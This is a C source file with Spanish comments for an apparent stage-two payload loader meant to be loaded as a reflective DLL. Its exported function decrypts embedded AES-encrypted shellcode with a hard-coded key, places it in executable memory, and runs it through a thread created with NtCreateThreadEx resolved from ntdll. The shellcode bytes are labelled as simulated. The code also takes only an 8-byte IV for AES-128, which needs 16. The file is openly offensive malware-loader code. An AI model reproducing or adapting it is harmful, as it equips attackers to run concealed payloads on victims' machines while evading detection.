// ==============================================
// LL reflejada que contiene y ejecuta shellcode AES-cifrado con syscalls
// ==============================================

#include <windows.h>
#include <wincrypt.h>
#include "aes_utils.h"

//  NtCreateThreadEx
typedef NTSTATUS (WINAPI *NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE StartRoutine,
    LPVOID Argument,
    BOOL CreateSuspended,
    DWORD StackZeroBits,
    DWORD SizeOfStackCommit,
    DWORD SizeOfStackReserve,
    LPVOID BytesBuffer
);

// AES 128-bit Key (debe coincidir el encrypt de python)
unsigned char aes_key[16] = {
    0x4b, 0x65, 0x79, 0x31, 0x32, 0x33, 0x2d, 0x41,
    0x52, 0x4e, 0x4f, 0x4c, 0x44, 0x2d, 0x58, 0x21
};

// Shellcode cifrado 
unsigned char encrypted_shellcode[] = {
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, // IV (8 primeros bytes)
    0xA1, 0xB2, 0xC3, 0xD4, 0xE5, 0xF6, 0x17, 0x28, // Shellcode cifrado (simulado)
    0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00
};

__declspec(dllexport) void RunStage2() {
    unsigned char decrypted[512] = {0};
    DWORD encrypted_len = sizeof(encrypted_shellcode) - 8;
    unsigned char* iv = encrypted_shellcode;
    unsigned char* cipher = encrypted_shellcode + 8;

    aes_decrypt(cipher, encrypted_len, aes_key, iv, decrypted);

    // Alocar memoria RWX y copiar el shellcode descifrado
    LPVOID mem = VirtualAlloc(NULL, encrypted_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, decrypted, encrypted_len);

    // Resolver NtCreateThreadEx
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");

    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, GetCurrentProcess(),
        (LPTHREAD_START_ROUTINE)mem, NULL, FALSE, 0, 0, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
}

